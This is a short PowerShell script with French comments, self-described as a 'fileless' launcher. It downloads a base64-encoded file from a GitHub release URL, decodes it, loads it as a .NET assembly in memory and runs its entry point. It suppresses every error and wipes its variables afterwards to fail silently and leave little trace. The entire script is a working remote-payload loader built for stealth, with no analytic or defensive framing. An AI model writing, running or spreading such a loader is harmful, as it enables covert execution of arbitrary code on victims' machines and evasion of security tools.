# Script de lancement fileless
$ErrorActionPreference = "SilentlyContinue"

try {
    # Télécharger file.txt depuis GitHub
    $url = "https://github.com/thegoatofapi/AL/releases/download/C/file.txt"
    $webClient = New-Object System.Net.WebClient
    $base64 = $webClient.DownloadString($url)
    
    # Décoder et exécuter en mémoire
    $bytes = [Convert]::FromBase64String($base64)
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, @(@()))
    
    # Nettoyage
    $bytes = $null
    $base64 = $null
    [GC]::Collect()
} catch {
    # Échec silencieux
}
